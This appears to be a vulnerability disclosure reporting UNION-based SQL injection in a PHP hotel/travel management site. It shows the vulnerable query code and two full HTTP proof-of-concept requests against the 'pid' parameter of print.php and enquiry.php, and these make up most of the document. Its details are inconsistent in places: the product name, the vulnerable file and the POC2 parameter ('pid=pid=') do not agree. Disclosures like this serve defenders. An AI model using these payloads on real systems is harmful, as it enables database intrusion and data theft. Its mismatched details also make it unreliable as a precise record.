# Travel Management System has sql injection in enquiry.php



## supplier



https://code-projects.org/responsive-hotel-site-using-php-source-code/



## Vulnerability file



/admin/print.php

## describe



Due to the lack of purification or parameterization of PID parameters, attackers can inject malicious SQL code to manipulate database queries. By utilizing the SQL injection technique of UNION query, attackers can use functions such as UNION to directly query the fields required by the database. This can be used to confirm the existence of vulnerabilities and potentially extract sensitive information from the database.

## **Code analysis**

```
<?php
	ob_start();	
	include ('db.php');

	$pid = $_GET['pid'];
	
	
	
	$sql ="select * from payment where id = '$pid' ";
	$re = mysqli_query($con,$sql);
```

###### The key parameter has moved from '$pid' to '$sql'`

## POC1

```
GET /admin/print.php?pid=2'+UNION+ALL+SELECT+NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+fMnC HTTP/1.1
Host: 192.168.20.133
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5226nusitfi5p0qsg8q74pe0si
sec-ch-ua-platform: "Android"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
Connection: keep-alive
```

![image-20250104153049848](https://github.com/Huandtx/cve/raw/main/cve/Responsive%20Hotel%20Site/image-20250104153049848.png))

## POC2

```
GET /enquiry.php?pid=pid=-8993'+UNION+ALL+SELECT+NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+CVWw HTTP/1.1
Host: 192.168.20.133
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Android"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
Connection: keep-alive


```

![image-20250104153228228]((https://github.com/Huandtx/cve/raw/main/cve/Responsive%20Hotel%20Site/image-20250104153228228.png))

![image-20250104153334813](https://github.com/Huandtx/cve/raw/main/cve/Responsive%20Hotel%20Site/image-20250104153334813.png))
